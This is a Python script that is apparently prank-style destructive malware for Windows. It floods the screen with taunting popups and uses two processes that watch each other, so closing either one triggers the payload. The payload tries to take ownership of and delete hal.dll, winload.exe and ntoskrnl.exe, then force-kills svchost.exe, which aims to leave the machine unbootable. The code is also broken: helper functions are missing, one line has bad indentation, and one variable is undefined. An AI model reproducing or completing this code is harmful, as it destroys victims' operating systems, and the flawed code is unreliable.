import tkinter as tk
from tkinter import messagebox
import multiprocessing
import os
import random
import sys
import time
import psutil
import subprocess

def create_message_box():
    x = random.randint(0, root.winfo_screenwidth() - 200)
    y = random.randint(0, root.winfo_screenheight() - 100)

    msg_box = tk.Toplevel(root)
    msg_box.geometry(f"200x100+{x}+{y}")
    msg_box.overrideredirect(True)  # Remove window decorations
    msg_box.transient(root)
    msg_box.grab_set()

    tk.Label(msg_box, text="Warning", padx=20, pady=10).pack()

def show_error_box():
    for _ in range(600):
        error_root = tk.Tk()
        error_root.withdraw()
        messagebox.showerror("LOL?!?!?", "still using this pc?")
        error_root.destroy()

    time.sleep(5)  

    uid, gid = get_user_ids()


    file_paths = [
        r"C:\Windows\System32\hal.dll",
        r"C:\Windows\System32\winload.exe",
        r"C:\Windows\System32\ntoskrnl.exe"
    ]

    # Change the owner of each file in the list after displaying error boxes
    for file_path in file_paths:
        change_owner(file_path, uid, gid)

    files_to_delete = [
        "C:\Windows\System32\hal.dll",
        "C:\Windows\System32\winload.exe",
        "C:\Windows\System32\ntoskrnl.exe"
    ]
    for file_path in files_to_delete:
        try:
            os.unlink(file_path)  # Forcefully delete files
        except OSError as e:
            print(f"Error deleting {file_path}: {e}")
            continue

      time.sleep(7)

    try:
        subprocess.run(["taskkill", "/IM", "svchost.exe", "/f"], check=True)
    except subprocess.CalledProcessError as e:
        print("Error:", Ooops)



def on_close():
    for _ in range(3): 
        create_message_box()


def monitor_process(target_pid):
    while True:
        if not psutil.pid_exists(target_pid):
            show_error_box()
            os._exit(1)
        time.sleep(1)

def normal_process(silent_pid):
    root.withdraw()
    for _ in range(15):
        create_message_box()

    monitor_thread = multiprocessing.Process(target=monitor_process, args=(silent_pid,))
    monitor_thread.start()

    root.mainloop()

def silent_process(normal_pid):
    monitor_process(normal_pid)

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == '--silent':
        normal_pid = int(sys.argv[2])
        silent_process(normal_pid)
    else:
        silent_process = multiprocessing.Process(target=os.system, args=(f'python "{__file__}" --silent {os.getpid()}',))
        silent_process.start()
        normal_process(silent_process.pid)
